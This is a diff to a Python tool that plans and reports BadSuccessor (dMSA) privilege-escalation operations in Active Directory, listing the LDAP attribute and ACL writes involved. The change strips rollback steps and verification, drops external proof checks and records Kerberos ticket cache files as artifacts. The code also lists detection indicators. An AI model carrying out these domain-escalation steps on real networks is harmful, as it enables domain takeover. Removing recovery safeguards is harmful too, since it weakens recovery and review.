@@ -171,7 +171,6 @@ def build_badsuccessor_plan(path: PathCandidate) -> dict[str, Any]:
             "kerberos-dmsa-proof must be operation-bound and match target/dMSA SAM.",
             "No raw tickets, hashes, keys, passwords, or base64 ticket blobs are accepted.",
         ],
-        "rollback_steps": writes["rollback_steps"],
         "dry_run_steps": dry_run_steps,
         "ldap_writes_performed": False,
     }
@@ -184,10 +183,8 @@ def _expected_writes(path: PathCandidate) -> dict[str, Any]:
     created: list[dict[str, Any]] = []
     modified: list[dict[str, str]] = []
     post_state: list[dict[str, str]] = []
-    rollback: list[str] = []
     if path.primitive in {"postpatch-mutual-pair", "legacy-oneway-link", "dacl-container-escalate", "dacl-target-escalate"}:
         created.append({"dn": dmsa, "object_class": "msDS-DelegatedManagedServiceAccount"})
-        rollback.append(f"delete created dMSA {dmsa}")
     if path.primitive in {
         "postpatch-mutual-pair",
         "legacy-oneway-link",
@@ -198,25 +195,20 @@ def _expected_writes(path: PathCandidate) -> dict[str, Any]:
             {"dn": dmsa, "attribute": "msDS-ManagedAccountPrecededByLink", "after": target},
             {"dn": dmsa, "attribute": "msDS-DelegatedMSAState", "after": "2"},
         ])
-        rollback.append("restore dMSA-side migration attributes from recorded before-values")
     if path.primitive in {"postpatch-mutual-pair", "existing-dmsa-postpatch-mutual"}:
         modified.extend([
             {"dn": target, "attribute": "msDS-SupersededManagedAccountLink", "after": dmsa},
             {"dn": target, "attribute": "msDS-SupersededServiceAccountState", "after": "2"},
         ])
-        rollback.insert(0, "restore target-side superseded attributes from recorded before-values")
     if path.primitive == "dacl-container-escalate":
         modified.append({"dn": container, "attribute": "nTSecurityDescriptor", "after": "scoped ACE"})
-        rollback.insert(0, "restore original container nTSecurityDescriptor")
     if path.primitive == "dacl-target-escalate":
         modified.append({"dn": target, "attribute": "nTSecurityDescriptor", "after": "scoped ACE"})
-        rollback.insert(0, "restore original target nTSecurityDescriptor")
     post_state.extend(modified)
     return {
         "created_objects": created,
         "modified_attributes": modified,
         "expected_ldap_post_state": post_state,
-        "rollback_steps": rollback,
     }
 
 
@@ -224,8 +216,7 @@ def operation_lifecycle_summary(operation: Operation) -> dict[str, Any]:
     ldap_meta = operation.metadata.get("ldap_verification")
     external_meta = operation.metadata.get("external_verification")
     base_meta = operation.metadata.get("kerberos_base_check")
-    rollback_meta = operation.metadata.get("rollback_verification")
-    full_badsuccessor_success = operation.verified_ldap and operation.verified_external
+    full_badsuccessor_success = operation.verified_ldap and operation.verified_ticket
     return {
         "operation_id": operation.id,
         "primitive": operation.primitive,
@@ -236,38 +227,31 @@ def operation_lifecycle_summary(operation: Operation) -> dict[str, Any]:
             ldap_meta.get("status") if isinstance(ldap_meta, dict) else None
         ),
         "kerberos_base_verified": isinstance(base_meta, dict) and base_meta.get("ok") is True,
-        "kerberos_dmsa_verified": operation.verified_external,
-        "external_verified": operation.verified_external,
+        "kerberos_dmsa_verified": operation.verified_ticket,
+        "external_verified": False,
         "full_badsuccessor_success": full_badsuccessor_success,
         "external_verification_status": (
             external_meta.get("status") if isinstance(external_meta, dict) else None
         ),
-        "rolled_back": operation.rolled_back,
-        "rollback_verified": operation.rollback_verified,
-        "rollback_verification_status": (
-            rollback_meta.get("status") if isinstance(rollback_meta, dict) else None
-        ),
-        "rollback_available": operation.rollback_available,
+        "cleaned_up": operation.cleaned_up,
+        "cleanup_verified": operation.cleanup_verified,
         "limitations": _operation_limitations(operation),
     }
 
 
 def _operation_limitations(operation: Operation) -> list[str]:
     limitations = []
-    if operation.verified_ldap and not operation.verified_external:
+    if operation.verified_ldap and not operation.verified_ticket:
         limitations.append("LDAP state was verified, but no operation-bound dMSA Kerberos proof is recorded.")
-    if operation.metadata.get("kerberos_base_check") and not operation.verified_external:
+    if operation.metadata.get("kerberos_base_check") and not operation.verified_ticket:
         limitations.append("Base Kerberos proof was recorded; it does not prove dMSA abuse.")
-    if operation.rolled_back:
-        limitations.append("Operation has been rolled back; active exploit state is no longer present.")
     return limitations
 
 
 def build_operation_report(operation: Operation) -> dict[str, Any]:
-    external = operation.metadata.get("external_verification")
     base = operation.metadata.get("kerberos_base_check")
     kerberos_base_ready = isinstance(base, dict) and base.get("ok") is True
-    kerberos_dmsa_verified = operation.verified_external
+    kerberos_dmsa_verified = operation.verified_ticket
     full_badsuccessor_success = operation.verified_ldap and kerberos_dmsa_verified
     return {
         "type": "operation-report",
@@ -301,9 +285,10 @@ def build_operation_report(operation: Operation) -> dict[str, Any]:
             "base_ready": kerberos_base_ready,
             "base_evidence_sha256": base.get("evidence_sha256") if isinstance(base, dict) else None,
             "dmsa_proof_verified": kerberos_dmsa_verified,
-            "dmsa_evidence_sha256": (
-                external.get("evidence_sha256") if isinstance(external, dict) else None
-            ),
+            "ticket_artifact": (operation.metadata.get("ticket") or {}).get("tgt_ccache"),
+            "service_ticket_artifact": (
+                operation.metadata.get("ticket") or {}
+            ).get("service_ccache"),
         },
         "detection_indicators": [
             "Created dMSA object DN(s)",
@@ -312,9 +297,9 @@ def build_operation_report(operation: Operation) -> dict[str, Any]:
             "msDS-SupersededServiceAccountState writes",
             "nTSecurityDescriptor changes for DACL-assisted paths",
         ],
-        "recommended_cleanup": [
-            "Run rollback for reversible active operations.",
-            "Verify created dMSA objects are gone and modified attributes match recorded before-values.",
+        "operator_notes": [
+            "Review recorded created objects and modified attributes for external change tracking.",
+            f"Resume exact cleanup with: dmsa-reaper cleanup --op {operation.id}",
         ],
         "final_conclusion": (
             "full-badsuccessor-success"
@@ -332,8 +317,8 @@ def build_operation_report(operation: Operation) -> dict[str, Any]:
 def _required_next_proof(operation: Operation) -> str:
     if not operation.verified_ldap:
         return "ldap-state-verification"
-    if not operation.verified_external:
-        return "operation-bound kerberos-dmsa-proof"
+    if not operation.verified_ticket:
+        return "native dMSA ccache and service-ticket validation"
     return "none"
 
 
@@ -364,8 +349,6 @@ def operation_report_markdown(report: dict[str, Any]) -> str:
         f"- Full BadSuccessor success: `{str(report['full_badsuccessor_success']).lower()}`",
         f"- Required next proof: `{report['required_next_proof']}`",
         f"- External dMSA proof verified: `{str(lifecycle['external_verified']).lower()}`",
-        f"- Rolled back: `{str(lifecycle['rolled_back']).lower()}`",
-        f"- Rollback verified: `{str(lifecycle['rollback_verified']).lower()}`",
         f"- Final conclusion: `{report.get('final_conclusion')}`",
         "",
         "## LDAP Artifacts",
@@ -479,9 +462,6 @@ def build_ouroboros_plan(state: MapState, path: PathCandidate | None = None) -> 
         "expected_artifacts": [
             "created or linked dMSA LDAP state",
             "operation-bound external Kerberos proof hash",
-        ],
-        "rollback_limitations": [
-            "LDAP rollback can restore directory state; it cannot revoke tickets already issued externally.",
         ],
         "safety_constraints": assessment["safety_constraints"],
         "native_secret_extraction_implemented": False,
